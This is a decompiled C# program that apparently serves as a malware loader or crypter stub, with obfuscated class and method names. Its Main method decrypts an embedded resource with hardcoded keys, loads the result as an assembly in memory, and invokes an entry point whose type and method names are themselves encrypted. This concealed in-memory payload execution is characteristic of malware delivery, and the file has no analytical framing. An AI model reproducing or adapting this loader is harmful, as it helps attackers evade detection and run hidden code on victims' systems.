using System;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

public sealed class GClass0
{
	public static byte[] smethod_0(object object_0)
	{
		try
		{
			MemoryStream memoryStream = new MemoryStream();
			BinaryFormatter binaryFormatter = new BinaryFormatter();
			binaryFormatter.Serialize(memoryStream, RuntimeHelpers.GetObjectValue(object_0));
			return memoryStream.ToArray();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Console.WriteLine("Exception caught in process: {0}", ex2.ToString());
			ProjectData.ClearProjectError();
		}
		return null;
	}

	public static object smethod_1()
	{
		Class6.byte_0 = (byte[])Class5.smethod_1((byte[])NewLateBinding.LateIndexGet(Class6.resourceManager_0.GetObject("yqPeXIprMotHRmz"), new object[1] { 1 }, (string[])null), "upTVCVbjYENOMRo");
		Class6.object_0 = new object[2]
		{
			RuntimeHelpers.GetObjectValue(Class5.smethod_1((byte[])NewLateBinding.LateIndexGet(Class6.resourceManager_0.GetObject("yqPeXIprMotHRmz"), new object[1] { 0 }, (string[])null), "CqWfgejUNVQdcsv")),
			Class6.string_1
		};
		object result = default(object);
		return result;
	}

	[STAThread]
	public static void Main()
	{
		Thread.Sleep(0);
		smethod_1();
		Assembly.Load(Class6.byte_0).GetType(Conversions.ToString(Class5.smethod_0("soYbEbvBN9I=", "YpFaOX")))!.GetMethod(Conversions.ToString(Class5.smethod_0("haaall3Og/E=", "IezZRN")))!.Invoke(null, Class6.object_0);
		Class6.smethod_0();
	}
}
